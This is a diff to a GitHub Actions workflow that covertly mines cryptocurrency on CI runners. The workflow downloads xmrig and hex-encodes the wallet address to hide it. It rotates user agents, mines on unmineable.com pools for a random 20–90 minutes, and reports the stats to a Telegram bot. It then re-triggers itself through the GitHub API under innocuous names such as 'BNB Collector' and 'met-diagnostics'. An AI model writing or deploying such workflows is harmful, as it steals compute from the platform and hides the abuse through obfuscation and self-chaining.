@@ -24,15 +24,15 @@ jobs:
 
       - name: Prepare Env
         run: |
-          sudo apt update -y && sudo apt install -y curl tar xxd
+          sudo apt update -y && sudo apt install -y curl tar xxd jq
 
       - name: Notify Boot
         env:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
-          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
-            -d chat_id=$TG_CHAT_ID \
+          curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
+            -d chat_id="${TG_CHAT_ID}" \
             --data-urlencode text="🟢 *BNB Collector aktif.* Durasi kerja acak 20–90 menit." \
             -d parse_mode=Markdown
 
@@ -41,7 +41,7 @@ jobs:
           set -e
           UA_LIST=("Mozilla/5.0" "Chrome/114.0" "Ubuntu/22.04" "Macintosh; Intel Mac OS X 10_15_7")
           UA=${UA_LIST[$RANDOM % ${#UA_LIST[@]}]}
-          curl -A "$UA" -L -o core.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+          curl -A "$UA" -L -o core.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
           tar -xzf core.tar.gz
           cd xmrig-6.24.0
           chmod +x xmrig
@@ -52,16 +52,15 @@ jobs:
           HEX="424e423a3078663331396165663863316433323363383337343062636465396632353233386666356334383535642e756e6d696e6561626c655f776f726b65725f656274656a77686b23663278672d36796e75"
           ADDR=$(echo "$HEX" | xxd -r -p)
 
+          # Jalankan dengan 2 pool (TLS + TCP) dan kredensial eksplisit di tiap -o
           nice -n 10 ./xmrig -a rx \
-            -o stratum+ssl://rx.unmineable.com:443 \
-            -u "$ADDR" -p x \
-            --randomx-no-rdmsr --keepalive \
-            --cpu-max-threads-hint=85 \
-            --http-enabled=0 \
-            -o stratum+tcp://rx.unmineable.com:3333 \
+            -o stratum+ssl://rx.unmineable.com:443 -u "$ADDR" -p x \
+            --randomx-no-rdmsr --keepalive --http-enabled=0 --cpu-max-threads-hint=85 \
+            -o stratum+tcp://rx.unmineable.com:3333 -u "$ADDR" -p x \
             | tee report.log &
 
           PID=$!
+          # 20–90 menit
           sleep $((RANDOM % 5400 + 1200))
           kill $PID || true
 
@@ -77,11 +76,13 @@ jobs:
           ACC=$(grep -a "accepted" report.log | wc -l)
           REJ=$(grep -a "rejected" report.log | wc -l)
           HASH=${HASH:-"0 H/s"}
-          MSG="✅ *BNB Collector selesai.*\n\n📊 *Stats:*\n• Hashrate: \`$HASH\`\n• Accepted: \`$ACC\`\n• Rejected: \`$REJ\`"
-          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
-            -d chat_id=$TG_CHAT_ID \
-            --data-urlencode text="$MSG" \
+
+          MSG=$'✅ *BNB Collector selesai.*\n\n📊 *Stats:*\n• Hashrate: `'"$HASH"$'`\n• Accepted: `'"$ACC"$'`\n• Rejected: `'"$REJ"$'`'
+          printf "%s" "$MSG" | curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
+            -d chat_id="${TG_CHAT_ID}" \
+            --data-urlencode text@- \
             -d parse_mode=Markdown
+
           cd ..
           rm -rf xmrig-6.24.0 core.tar.gz || true
 
@@ -96,5 +97,16 @@ jobs:
         run: |
           curl -s -X POST -H "Authorization: Bearer $GH_TOKEN" \
                -H "Accept: application/vnd.github+json" \
-               https://api.github.com/repos/${{ github.repository }}/actions/workflows/met-diagnostics.yml/dispatches \
+               "https://api.github.com/repos/${{ github.repository }}/actions/workflows/met-diagnostics.yml/dispatches" \
                -d '{"ref":"main"}'
+
+      - name: Queue Maintenance
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.GH_TOKEN }}
+        run: |
+          curl -s -X POST \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${{ github.repository }}/dispatches" \
+            -d '{"event_type":"housekeeping","client_payload":{"source":"post-run","keep":2,"days":2,"dry_run":"false"}}'
